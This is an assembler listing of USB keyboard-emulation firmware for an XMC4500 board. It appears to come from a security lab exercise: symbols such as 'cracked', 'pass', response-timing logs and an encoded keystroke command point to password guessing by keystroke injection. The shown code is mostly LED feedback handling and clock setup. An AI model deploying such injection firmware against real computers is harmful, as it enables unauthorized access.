+ 1459 0002 86B0     		sub	sp, sp, #24
+ 1460              	.LCFI27:
+ 1461              		.cfi_def_cfa_offset 32
+ 1462 0004 00AF     		add	r7, sp, #0
+ 1463              	.LCFI28:
+ 1464              		.cfi_def_cfa_register 7
+ 1465 0006 F860     		str	r0, [r7, #12]
+ 1466 0008 7B60     		str	r3, [r7, #4]
+ 1467 000a 0B46     		mov	r3, r1
+ 1468 000c FB72     		strb	r3, [r7, #11]
+ 1469 000e 1346     		mov	r3, r2
+ 1470 0010 BB72     		strb	r3, [r7, #10]
+ 319:main.c        **** 	uint8_t *report = (uint8_t*)ReportData;
+ 1471              		.loc 2 319 11
+ 1472 0012 7B68     		ldr	r3, [r7, #4]
+ 1473 0014 7B61     		str	r3, [r7, #20]
+ 320:main.c        **** 
+ 321:main.c        **** 	if(*report & HID_KEYBOARD_LED_NUMLOCK) {
+ 1474              		.loc 2 321 5
+ 1475 0016 7B69     		ldr	r3, [r7, #20]
+ 1476 0018 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1477              		.loc 2 321 13
+ 1478 001a 03F00103 		and	r3, r3, #1
+ 1479              		.loc 2 321 4
+ 1480 001e 002B     		cmp	r3, #0
+ 1481 0020 1FD0     		beq	.L46
+ 322:main.c        **** 		XMC_GPIO_SetOutputHigh(LED1);
+ 1482              		.loc 2 322 3
+ 1483 0022 0121     		movs	r1, #1
+ 1484 0024 1D48     		ldr	r0, .L52
+ 1485 0026 FFF7FEFF 		bl	XMC_GPIO_SetOutputHigh
+ 323:main.c        **** 		if(initial_feedback) 
+ 1486              		.loc 2 323 6
+ 1487 002a 1D4B     		ldr	r3, .L52+4
+ 1488 002c 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1489              		.loc 2 323 5
+ 1490 002e 002B     		cmp	r3, #0
+ 1491 0030 1ED0     		beq	.L47
+ 324:main.c        **** 		{
+ 325:main.c        **** 			if(NUMLOCK_PRESSES>0) feedback_received=1;
+ 1492              		.loc 2 325 22
+ 1493 0032 1C4B     		ldr	r3, .L52+8
+ 1494 0034 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1495              		.loc 2 325 6
+ 1496 0036 002B     		cmp	r3, #0
+ 1497 0038 02D0     		beq	.L48
+ 1498              		.loc 2 325 43 discriminator 1
+ 1499 003a 1B4B     		ldr	r3, .L52+12
+ 1500 003c 0122     		movs	r2, #1
+ 1501 003e 1A70     		strb	r2, [r3]
+ 1502              	.L48:
+ 326:main.c        **** 			initial_feedback=0;
+ 1503              		.loc 2 326 20
+ 1504 0040 174B     		ldr	r3, .L52+4
+ 1505 0042 0022     		movs	r2, #0
+ 1506 0044 1A70     		strb	r2, [r3]
+ 327:main.c        **** 			NUMLOCK_PRESSES++;
+ 1507              		.loc 2 327 19
+ 1508 0046 174B     		ldr	r3, .L52+8
+ 1509 0048 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1510 004a 0133     		adds	r3, r3, #1
+ 1511 004c DAB2     		uxtb	r2, r3
+ 1512 004e 154B     		ldr	r3, .L52+8
+ 1513 0050 1A70     		strb	r2, [r3]
+ 328:main.c        **** 			if(NUMLOCK_PRESSES>10) NUMLOCK_PRESSES=2;
+ 1514              		.loc 2 328 22
+ 1515 0052 144B     		ldr	r3, .L52+8
+ 1516 0054 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1517              		.loc 2 328 6
+ 1518 0056 0A2B     		cmp	r3, #10
+ 1519 0058 0AD9     		bls	.L47
+ 1520              		.loc 2 328 42 discriminator 1
+ 1521 005a 124B     		ldr	r3, .L52+8
+ 1522 005c 0222     		movs	r2, #2
+ 1523 005e 1A70     		strb	r2, [r3]
+ 1524 0060 06E0     		b	.L47
+ 1525              	.L46:
+ 329:main.c        **** 		}
+ 330:main.c        **** 
+ 331:main.c        **** 	}
+ 332:main.c        **** 	else 
+ 333:main.c        **** 	{
+ 334:main.c        **** 		XMC_GPIO_SetOutputLow(LED1);
+ 1526              		.loc 2 334 3
+ 1527 0062 0121     		movs	r1, #1
+ 1528 0064 0D48     		ldr	r0, .L52
+ 1529 0066 FFF7FEFF 		bl	XMC_GPIO_SetOutputLow
+ 335:main.c        **** 		initial_feedback=1;
+ 1530              		.loc 2 335 19
+ 1531 006a 0D4B     		ldr	r3, .L52+4
+ 1532 006c 0122     		movs	r2, #1
+ 1533 006e 1A70     		strb	r2, [r3]
+ 1534              	.L47:
+ 336:main.c        **** 
+ 337:main.c        **** 	}
+ 338:main.c        **** 	if(*report & HID_KEYBOARD_LED_CAPSLOCK) 
+ 1535              		.loc 2 338 5
+ 1536 0070 7B69     		ldr	r3, [r7, #20]
+ 1537 0072 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1538              		.loc 2 338 13
+ 1539 0074 03F00203 		and	r3, r3, #2
+ 1540              		.loc 2 338 4
+ 1541 0078 002B     		cmp	r3, #0
+ 1542 007a 07D0     		beq	.L49
+ 339:main.c        **** 		{
+ 340:main.c        **** 			XMC_GPIO_SetOutputHigh(LED2);
+ 1543              		.loc 2 340 4
+ 1544 007c 0021     		movs	r1, #0
+ 1545 007e 0748     		ldr	r0, .L52
+ 1546 0080 FFF7FEFF 		bl	XMC_GPIO_SetOutputHigh
+ 341:main.c        **** 			cracked=1;
+ 1547              		.loc 2 341 11
+ 1548 0084 094B     		ldr	r3, .L52+16
+ 1549 0086 0122     		movs	r2, #1
+ 1550 0088 1A70     		strb	r2, [r3]
+ 342:main.c        **** 		}
+ 343:main.c        **** 	else 
+ 344:main.c        **** 		XMC_GPIO_SetOutputLow(LED2);
+ 345:main.c        **** }
+ 1551              		.loc 2 345 1
+ 1552 008a 03E0     		b	.L51
+ 1553              	.L49:
+ 344:main.c        **** }
+ 1554              		.loc 2 344 3
+ 1555 008c 0021     		movs	r1, #0
+ 1556 008e 0348     		ldr	r0, .L52
+ 1557 0090 FFF7FEFF 		bl	XMC_GPIO_SetOutputLow
+ 1558              	.L51:
+ 1559              		.loc 2 345 1
+ 1560 0094 00BF     		nop
+ 1561 0096 1837     		adds	r7, r7, #24
+ 1562              	.LCFI29:
+ 1563              		.cfi_def_cfa_offset 8
+ 1564 0098 BD46     		mov	sp, r7
+ 1565              	.LCFI30:
+ 1566              		.cfi_def_cfa_register 13
+ 1567              		@ sp needed
+ 1568 009a 80BD     		pop	{r7, pc}
+ 1569              	.L53:
+ 1570              		.align	2
+ 1571              	.L52:
+ 1572 009c 00810248 		.word	1208123648
+ 1573 00a0 00000000 		.word	initial_feedback
+ 1574 00a4 00000000 		.word	NUMLOCK_PRESSES
+ 1575 00a8 00000000 		.word	feedback_received
+ 1576 00ac 00000000 		.word	cracked
+ 1577              		.cfi_endproc
+ 1578              	.LFE206:
+ 1580              		.section	.text.SystemCoreClockSetup,"ax",%progbits
+ 1581              		.align	1
+ 1582              		.global	SystemCoreClockSetup
+ 1583              		.syntax unified
+ 1584              		.thumb
+ 1585              		.thumb_func
+ 1586              		.fpu fpv4-sp-d16
+ 1588              	SystemCoreClockSetup:
+ 1589              	.LFB207:
+ 346:main.c        **** 
+ 347:main.c        **** void SystemCoreClockSetup(void) {
+ 1590              		.loc 2 347 33
+ 1591              		.cfi_startproc
+ 1592              		@ args = 0, pretend = 0, frame = 0
+ 1593              		@ frame_needed = 1, uses_anonymous_args = 0
+ 1594 0000 80B5     		push	{r7, lr}
+ 1595              	.LCFI31:
+ 1596              		.cfi_def_cfa_offset 8
+ 1597              		.cfi_offset 7, -8
+ 1598              		.cfi_offset 14, -4
+ 1599 0002 00AF     		add	r7, sp, #0
+ 1600              	.LCFI32:
+ 1601              		.cfi_def_cfa_register 7
+ 348:main.c        **** 	/* Setup settings for USB clock */
+ 349:main.c        **** 	XMC_SCU_CLOCK_Init(&clock_config);
+ 1602              		.loc 2 349 2
+ 1603 0004 0A48     		ldr	r0, .L55
+ 1604 0006 FFF7FEFF 		bl	XMC_SCU_CLOCK_Init
+ 350:main.c        **** 
+ 351:main.c        **** 	XMC_SCU_CLOCK_EnableUsbPll();
+ 1605              		.loc 2 351 2
+ 1606 000a FFF7FEFF 		bl	XMC_SCU_CLOCK_EnableUsbPll
+ 352:main.c        **** 	XMC_SCU_CLOCK_StartUsbPll(2, 64);
+ 1607              		.loc 2 352 2
+ 1608 000e 4021     		movs	r1, #64
+ 1609 0010 0220     		movs	r0, #2
+ 1610 0012 FFF7FEFF 		bl	XMC_SCU_CLOCK_StartUsbPll
+ 353:main.c        **** 	XMC_SCU_CLOCK_SetUsbClockDivider(4);
+ 1611              		.loc 2 353 2
+ 1612 0016 0420     		movs	r0, #4
+ 1613 0018 FFF7FEFF 		bl	XMC_SCU_CLOCK_SetUsbClockDivider
+ 354:main.c        **** 	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
+ 1614              		.loc 2 354 2
+ 1615 001c 0020     		movs	r0, #0
+ 1616 001e FFF7FEFF 		bl	XMC_SCU_CLOCK_SetUsbClockSource
+ 355:main.c        **** 	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);
+ 1617              		.loc 2 355 2
+ 1618 0022 0120     		movs	r0, #1
+ 1619 0024 FFF7FEFF 		bl	XMC_SCU_CLOCK_EnableClock
+ 356:main.c        **** 
+ 357:main.c        **** 	SystemCoreClockUpdate();
+ 1620              		.loc 2 357 2
+ 1621 0028 FFF7FEFF 		bl	SystemCoreClockUpdate
+ 358:main.c        **** }
+ 1622              		.loc 2 358 1
+ 1623 002c 00BF     		nop
+ 1624 002e 80BD     		pop	{r7, pc}
+ 1625              	.L56:
+ 1626              		.align	2
+ 1627              	.L55:
+ 1628 0030 00000000 		.word	clock_config
+ 1629              		.cfi_endproc
+ 1630              	.LFE207:
+ 1632              		.bss
+ 1633              	indexToSend.12605:
+ 1634 0018 00       		.space	1
+ 1636              	characterSent.12604:
+ 1637 0019 00       		.space	1
+ 1639              		.data
+ 1640              		.align	2
+ 1643              	CMD_mod.12616:
+ 1644 0370 02020002 		.ascii	"\002\002\000\002\002\002\002\000\002\002\000\000\000"
+ 1644      02020200 
+ 1644      02020000 
+ 1644      00
+ 1645 037d 00000000 		.ascii	"\000\000\000\000\000\000\002\002\002\002\002\002\002"
+ 1645      00000202 
+ 1645      02020202 
+ 1645      02
+ 1646 038a 0200     		.ascii	"\002\000"
+ 1647              		.align	2
+ 1650              	CMD_msg.12615:
+ 1651 038c 06072808 		.ascii	"\006\007(\010\006\013\022,dd' $$\037& ',\037\013\004"
+ 1651      060B122C 
+ 1651      64642720 
+ 1651      24241F26 
+ 1651      20272C1F 
+ 1652 03a2 060E0807 		.ascii	"\006\016\010\007\037("
+ 1652      1F28
+ 1653              		.bss
+ 1654              	i.12608:
+ 1655 001a 00       		.space	1
+ 1657              	iindex.12613:
+ 1658 001b 00       		.space	1
+ 1660              	jindex.12614:
+ 1661 001c 00       		.space	1
+ 1663              	acc.12612:
+ 1664 001d 00       		.space	1
+ 1666 001e 0000     		.align	2
+ 1667              	pass.12607:
+ 1668 0020 00000000 		.space	200
+ 1668      00000000 
+ 1668      00000000 
+ 1668      00000000 
+ 1668      00000000 
+ 1670              	j.12609:
+ 1671 00e8 00       		.space	1
+ 1673              	x.12610:
+ 1674 00e9 00       		.space	1
+ 1676              	y.12611:
+ 1677 00ea 00       		.space	1
+ 1679              	c.12606:
+ 1680 00eb 00       		.space	1
+ 1682              		.text
+ 1683              	.Letext0:
+ 1684              		.file 3 "/usr/lib/gcc/arm-none-eabi/9.2.1/include/stddef.h"
+ 1685              		.file 4 "/usr/include/newlib/sys/_types.h"
+ 1686              		.file 5 "/usr/include/newlib/sys/reent.h"
+ 1687              		.file 6 "/usr/include/newlib/sys/lock.h"
+ 1688              		.file 7 "/usr/lib/gcc/arm-none-eabi/9.2.1/include/stdint.h"
+ 1689              		.file 8 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/CMSIS/Include/core_cm4.h"
+ 1690              		.file 9 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/CMSIS/Infineon/XMC4500_series/Include/system_X
+ 1691              		.file 10 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/CMSIS/Infineon/XMC4500_series/Include/XMC4500
+ 1692              		.file 11 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc4_gpio.h"
+ 1693              		.file 12 "/usr/include/newlib/stdlib.h"
+ 1694              		.file 13 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_usbd_regs.h"
+ 1695              		.file 14 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc4_scu.h"
+ 1696              		.file 15 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_usbd.h"
+ 1697              		.file 16 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Core/XMC4000/U
+ 1698              		.file 17 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Core/XMC4000/.
+ 1699              		.file 18 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Core/XMC4000/.
+ 1700              		.file 19 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Core/XMC4000/.
+ 1701              		.file 20 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Core/USBTask.h
+ 1702              		.file 21 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Class/Device/.
+ 1703              		.file 22 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Class/Device/H
+ 1704              		.file 23 "KeyboardHID.h"
+DEFINED SYMBOLS
+                            *ABS*:0000000000000000 main.c
+     /tmp/ccMkjtpx.s:17     .text.XMC_GPIO_SetOutputHigh:0000000000000000 $t
+     /tmp/ccMkjtpx.s:24     .text.XMC_GPIO_SetOutputHigh:0000000000000000 XMC_GPIO_SetOutputHigh
+     /tmp/ccMkjtpx.s:70     .text.XMC_GPIO_SetOutputLow:0000000000000000 $t
+     /tmp/ccMkjtpx.s:76     .text.XMC_GPIO_SetOutputLow:0000000000000000 XMC_GPIO_SetOutputLow
+     /tmp/ccMkjtpx.s:124    .bss:0000000000000000 feedback_received
+     /tmp/ccMkjtpx.s:125    .bss:0000000000000000 $d
+     /tmp/ccMkjtpx.s:129    .bss:0000000000000001 cracked
+     /tmp/ccMkjtpx.s:134    .bss:0000000000000002 sent
+     /tmp/ccMkjtpx.s:139    .bss:0000000000000003 initial_feedback
+     /tmp/ccMkjtpx.s:144    .bss:0000000000000004 max_found
+     /tmp/ccMkjtpx.s:149    .bss:0000000000000005 mReset
+     /tmp/ccMkjtpx.s:154    .bss:0000000000000006 p
+     /tmp/ccMkjtpx.s:159    .bss:0000000000000007 NUMLOCK_PRESSES
+     /tmp/ccMkjtpx.s:164    .bss:0000000000000008 ready_to_Enter
+     /tmp/ccMkjtpx.s:169    .bss:0000000000000009 maxI
+     /tmp/ccMkjtpx.s:174    .bss:000000000000000a maxJ
+     /tmp/ccMkjtpx.s:180    .bss:000000000000000c sending_time
+     /tmp/ccMkjtpx.s:186    .bss:0000000000000010 response_time
+     /tmp/ccMkjtpx.s:193    .data:0000000000000000 keys
+     /tmp/ccMkjtpx.s:190    .data:0000000000000000 $d
+     /tmp/ccMkjtpx.s:507    .bss:0000000000000014 millisec
+                            *COM*:0000000000000190 log_low
+                            *COM*:0000000000000190 log_high
+     /tmp/ccMkjtpx.s:516    .rodata:0000000000000000 clock_config
+     /tmp/ccMkjtpx.s:513    .rodata:0000000000000000 $d
+     /tmp/ccMkjtpx.s:532    .text.getMaxResponse:0000000000000000 $t
+     /tmp/ccMkjtpx.s:539    .text.getMaxResponse:0000000000000000 getMaxResponse
+     /tmp/ccMkjtpx.s:664    .text.getMaxResponse:00000000000000a0 $d
+     /tmp/ccMkjtpx.s:675    .text.main:0000000000000000 $t
+     /tmp/ccMkjtpx.s:682    .text.main:0000000000000000 main
+     /tmp/ccMkjtpx.s:808    .text.main:00000000000000c8 $d
+     /tmp/ccMkjtpx.s:821    .text.CALLBACK_HID_Device_CreateHIDReport:0000000000000000 $t
+     /tmp/ccMkjtpx.s:828    .text.CALLBACK_HID_Device_CreateHIDReport:0000000000000000 CALLBACK_HID_Device_CreateHIDReport
+     /tmp/ccMkjtpx.s:1285   .text.CALLBACK_HID_Device_CreateHIDReport:00000000000002b0 $d
+     /tmp/ccMkjtpx.s:1633   .bss:0000000000000018 indexToSend.12605
+     /tmp/ccMkjtpx.s:1636   .bss:0000000000000019 characterSent.12604
+     /tmp/ccMkjtpx.s:1643   .data:0000000000000370 CMD_mod.12616
+     /tmp/ccMkjtpx.s:1650   .data:000000000000038c CMD_msg.12615
+     /tmp/ccMkjtpx.s:1654   .bss:000000000000001a i.12608
+     /tmp/ccMkjtpx.s:1657   .bss:000000000000001b iindex.12613
+     /tmp/ccMkjtpx.s:1660   .bss:000000000000001c jindex.12614
+     /tmp/ccMkjtpx.s:1663   .bss:000000000000001d acc.12612
+     /tmp/ccMkjtpx.s:1667   .bss:0000000000000020 pass.12607
+     /tmp/ccMkjtpx.s:1670   .bss:00000000000000e8 j.12609
+     /tmp/ccMkjtpx.s:1673   .bss:00000000000000e9 x.12610
+     /tmp/ccMkjtpx.s:1676   .bss:00000000000000ea y.12611
+     /tmp/ccMkjtpx.s:1313   .text.CALLBACK_HID_Device_CreateHIDReport:0000000000000318 $t
+     /tmp/ccMkjtpx.s:1427   .text.CALLBACK_HID_Device_CreateHIDReport:00000000000003b8 $d
+     /tmp/ccMkjtpx.s:1441   .text.CALLBACK_HID_Device_ProcessHIDReport:0000000000000000 $t
+     /tmp/ccMkjtpx.s:1448   .text.CALLBACK_HID_Device_ProcessHIDReport:0000000000000000 CALLBACK_HID_Device_ProcessHIDReport
+     /tmp/ccMkjtpx.s:1572   .text.CALLBACK_HID_Device_ProcessHIDReport:000000000000009c $d
+     /tmp/ccMkjtpx.s:1581   .text.SystemCoreClockSetup:0000000000000000 $t
+     /tmp/ccMkjtpx.s:1588   .text.SystemCoreClockSetup:0000000000000000 SystemCoreClockSetup
+     /tmp/ccMkjtpx.s:1628   .text.SystemCoreClockSetup:0000000000000030 $d
+     /tmp/ccMkjtpx.s:1679   .bss:00000000000000eb c.12606
+                           .group:0000000000000000 wm4.0.1ef749480d5223b912d851bdb3b2139f
+                           .group:0000000000000000 wm4._newlib_version.h.4.1ef4e12f167f8b69d7c30054be56050d
+                           .group:0000000000000000 wm4.newlib.h.21.1ae2897bc09bbe4bc80ffb801fb02432
+                           .group:0000000000000000 wm4.ieeefp.h.77.f33a4dce62116f6f5175ff8bae57a54c
+                           .group:0000000000000000 wm4.features.h.22.026edb2397769f4ae13f35900dbdb560
+                           .group:0000000000000000 wm4.config.h.224.c701144a7b0518c6ee9b9b5465b79f81
+                           .group:0000000000000000 wm4._ansi.h.31.de524f58584151836e90d8620a16f8e8
+                           .group:0000000000000000 wm4.stddef.h.39.27677723d43e5b5a7afdf8d798429f1d
+                           .group:0000000000000000 wm4._types.h.20.dd0d04dca3800a0d2a6129b87f3adbb2
+                           .group:0000000000000000 wm4.stddef.h.155.3588ebfdd1e8c7ede80509bb9c3b8009
+                           .group:0000000000000000 wm4._default_types.h.6.959254cf5f09734ea7516c89e8bb21bd
+                           .group:0000000000000000 wm4._types.h.127.34941de1b2539d59d5cac00e0dd27a45
+                           .group:0000000000000000 wm4.reent.h.17.e292bf8b0bec6c96e131a54347145a30
+                           .group:0000000000000000 wm4.lock.h.2.c0958401bd0ce484d507ee19aacab817
+                           .group:0000000000000000 wm4.reent.h.77.dcd6129ff07fe81bd5636db29abe53b2
+                           .group:0000000000000000 wm4.cdefs.h.49.2bf373aedffd8b393ccd11dc057e8547
+                           .group:0000000000000000 wm4.string.h.15.dab3980bf35408a4c507182805e2de3a
+                           .group:0000000000000000 wm4.stddef.h.155.ba788add86a0e365f264484f110c3c29
+                           .group:0000000000000000 wm4.stdint.h.29.6d480f4ba0f60596e88234283d42444f
+                           .group:0000000000000000 wm4.stdbool.h.29.07dce69c3b78884144b7f7bd19483461
+                           .group:0000000000000000 wm4.xmc_device.h.61.ba2d082e12f51240746cffdd60d42b81
+                           .group:0000000000000000 wm4.XMC4500.h.55.9aa45b9b5790506b2dcb963e4e7adeaf
+                           .group:0000000000000000 wm4.core_cm4.h.32.6c6eb1c8daeca23ce7ba79c8e8120d52
+                           .group:0000000000000000 wm4.cmsis_gcc.h.26.91b63349961c35637933e4fba51b867b
+                           .group:0000000000000000 wm4.core_cm4.h.172.fdd5a388a160bb6ff767b7d7ee212268
+                           .group:0000000000000000 wm4.system_XMC4500.h.42.99124977c10ca8844a71949adbeabd70
+                           .group:0000000000000000 wm4.XMC4500.h.208.b340195df97f067735c4c769ba59985a
+                           .group:0000000000000000 wm4.xmc_device.h.1460.8860499b404961ffcfbb8d1fefcb2146
+                           .group:0000000000000000 wm4.xmc_common.h.92.3f4336a80569affab05a81145b87c2fc
+                           .group:0000000000000000 wm4.xmc_gpio.h.97.fa6a2e1be6030a75d960293cc3bbbd6b
+                           .group:0000000000000000 wm4.xmc4_gpio_map.h.74.66e9110cf801b78826ef5354da51c32f
+                           .group:0000000000000000 wm4.xmc4_gpio.h.79.ce6c49508b5a7769c66e7e3c21dcdfe4
+                           .group:0000000000000000 wm4.USB.h.376.cfdb9ecb25c70fec676f585dede264a7
+                           .group:0000000000000000 wm4.Common.h.60.c2f00e237f5994003db83c2422602b22
+                           .group:0000000000000000 wm4.BoardTypes.h.52.ca64813ccee737bcc2115eab5e075fdb
+                           .group:0000000000000000 wm4.CompilerSpecific.h.55.4a5e5ff77cd35e49c89cf2115251aee0
+                           .group:0000000000000000 wm4.Attributes.h.56.73b3ee26b0836c2dec569a5fa6f1b355
+                           .group:0000000000000000 wm4.Endianness.h.57.3ac00c5468f4b91b806a0e6dba047e9c
+                           .group:0000000000000000 wm4.Common.h.105.4b937a9cc9dcdb26c3f07541b0b763a8
+                           .group:0000000000000000 wm4.USBController.h.49.cbfc73805155b6fff6267400af3f4eec
+                           .group:0000000000000000 wm4.stdlib.h.13.4ed386f5c1a80d71e72172885d946ef2
+                           .group:0000000000000000 wm4.alloca.h.8.dfc0c703c47ec3e69746825b17d9e66d
+                           .group:0000000000000000 wm4.stdlib.h.56.f4862cfbf4363a1db01842d5bdf72c18
+                           .group:0000000000000000 wm4.xmc_usbd_regs.h.80.57c6c85fa0ecbc9f8327ce445aebb9bc
+                           .group:0000000000000000 wm4.xmc4_scu.h.83.0449f5880ac071460ec1a8072311ea51
+                           .group:0000000000000000 wm4.xmc_usbd.h.122.ce57a9e6a9da48ee33ece02813c49593
+                           .group:0000000000000000 wm4.USBController_XMC4000.h.71.902f2653e09cb8b25245faa82cc6b907
+                           .group:0000000000000000 wm4.StdDescriptors.h.73.7d17e8be7a73b855fc0f8827303b7597
+                           .group:0000000000000000 wm4.Endpoint.h.73.3734de3e84ab23fb43d81f41fba620ec
+                           .group:0000000000000000 wm4.Device_XMC4000.h.86.6803bdd99d84e764a570256c87a24d0a
+                           .group:0000000000000000 wm4.StdRequestType.h.50.461dce94a3ee1fa9ff31ec5f28bd9699
+                           .group:0000000000000000 wm4.ConfigDescriptors.h.51.0d67ebf453774188abf5a503ba8f6735
+                           .group:0000000000000000 wm4.CDCClass.h.61.0d41ba255f7ce6f076fd610d8396dd1f
+                           .group:0000000000000000 wm4.CDCClassCommon.h.72.14ca578d8547e19a8a0c0d2d328483bd
+                           .group:0000000000000000 wm4.stdio.h.27.3fc80220048df77954e38daec3bb9670
+                           .group:0000000000000000 wm4.stdarg.h.34.3a23a216c0c293b3d2ea2e89281481e6
+                           .group:0000000000000000 wm4.types.h.40.8b6acba56cefbb11746718204edc8f5e
+                           .group:0000000000000000 wm4._stdint.h.10.c24fa3af3bc1706662bb5593a907e841
+                           .group:0000000000000000 wm4._endian.h.31.65a10590763c3dde1ac4a7f66d7d4891
+                           .group:0000000000000000 wm4.endian.h.9.49f3a4695c1b61e8a0808de3c4a106cb
+                           .group:0000000000000000 wm4._timeval.h.32.bec3221fa7a9bb0bdde696c9c57e47d2
+                           .group:0000000000000000 wm4.timespec.h.41.d855182eb0e690443ab8651bcedca6e1
+                           .group:0000000000000000 wm4.select.h.19.97ca6fd0c752a0f3b6719fd314d361e6
+                           .group:0000000000000000 wm4.types.h.51.5571ec98f267d17d3c670b7a3ba33afa
+                           .group:0000000000000000 wm4.sched.h.22.c60982713a5c428609783c78f9c78d95
+                           .group:0000000000000000 wm4._pthreadtypes.h.36.fcee9961c35163dde6267ef772ad1972
+                           .group:0000000000000000 wm4.stdio.h.2.4aa87247282eca6c8f36f9de33d8df1a
+                           .group:0000000000000000 wm4.stdio.h.81.932d0c162786b883f622b8d05c120c78
+                           .group:0000000000000000 wm4.HIDClass.h.62.6bb32c59177b21a83b8e65c5a1b0a615
+                           .group:0000000000000000 wm4.HIDReportData.h.47.f13f4956396e0bec70835fe634fcc24d
+                           .group:0000000000000000 wm4.HIDParser.h.88.4b86fe94cb8d01713592cdd0391b606b
+                           .group:0000000000000000 wm4.HIDClassCommon.h.71.a60cdf9d7cd69289f43dde215b509193
+                           .group:0000000000000000 wm4.MassStorageClass.h.61.e9235f3bd090b77f36343f082ef93107
+                           .group:0000000000000000 wm4.MassStorageClassCommon.h.51.6aefecf288eb3c3c6c9bde61e26dd765
+                           .group:0000000000000000 wm4.Descriptors.h.37.a9c2e3eb1c5646a4a3911d89f91c5fab
+                           .group:0000000000000000 wm4.german_keyboardCodes.h.2.e1b4448076427773e95ef41c8020de97
+
+UNDEFINED SYMBOLS
+__aeabi_ui2d
+__aeabi_ddiv
+__aeabi_d2f
+XMC_GPIO_SetMode
+USB_Init
+HID_Device_USBTask
+Keyboard_HID_Interface
+XMC_SCU_CLOCK_Init
+XMC_SCU_CLOCK_EnableUsbPll
+XMC_SCU_CLOCK_StartUsbPll
+XMC_SCU_CLOCK_SetUsbClockDivider
+XMC_SCU_CLOCK_SetUsbClockSource
+XMC_SCU_CLOCK_EnableClock
+SystemCoreClockUpdate
